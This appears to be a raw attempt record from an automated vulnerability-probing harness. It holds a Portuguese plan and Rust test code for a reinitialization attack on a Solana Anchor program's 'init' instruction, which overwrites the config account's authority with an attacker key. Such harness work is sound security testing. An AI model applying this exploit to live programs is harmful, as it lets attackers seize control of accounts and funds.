attempts.raw:
{
  "plan": "O cenário monta uma conta `config` já inicializada (com authority, is_initialized=true e vault_balance=0) usando o baseline legítimo da instrução `init`. O baseline usa uma conta `config` vazia (empty_account) e um authority signer, provando que o cenário está correto. O ataque tenta chamar `init` novamente sobre a mesma conta `config` já inicializada, com um novo authority, para sobrescrever o estado. O efeito medido é que a conta `config` resultante tem o novo authority e/ou vault_balance diferente do estado original, demonstrando a reinicialização.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();

// Conta config vazia para o baseline
let config_key = Pubkey::new_unique();
let config_empty = empty_account();

let (system_program_key, system_program_account) = system_program_account();

// Baseline: init legítimo
let ix_baseline = env.anchor_ix(
    "init",
    &(),
    vec![
        AccountMeta::new(config_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_key, false),
    ],
);
let contas_baseline = vec![
    (config_key, config_empty.clone()),
    (authority, wallet(1_000_000_000)),
    (system_program_key, system_program_account.clone()),
];
let r_baseline = env.baseline("init legítimo", &ix_baseline, &contas_baseline);

// Extrai a conta config resultante do baseline
let config_pos = r_baseline.resulting_accounts.iter().position(|(k, _)| *k == config_key);
let config_after_baseline = match config_pos {
    Some(i) => r_baseline.resulting_accounts[i].1.clone(),
    None => config_empty.clone(),
};

// Ataque: chamar init novamente sobre a mesma conta já inicializada
let ix_attack = env.anchor_ix(
    "init",
    &(),
    vec![
        AccountMeta::new(config_key, true),
        AccountMeta::new(attacker, true),
        AccountMeta::new_readonly(system_program_key, false),
    ],
);
let contas_attack = vec![
    (config_key, config_after_baseline.clone()),
    (attacker, wallet(1_000_000_000)),
    (system_program_key, system_program_account.clone()),
];
let r_attack = env.attack("reinit: init sobre conta já inicializada", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let config_final = after(&r_attack, &config_key);
    let authority_final = read_pubkey(config_final.data(), 8);
    let is_init_final = config_final.data()[40] != 0;
    let vault_final = read_u64(config_final.data(), 41);
    // O dano: a conta foi reinicializada com novo authority (attacker) e estado sobrescrito
    env.effect(
        "config reinicializada com novo authority (attacker)",
        authority_final == attacker && is_init_final && vault_final == 0,
    );
}"
}

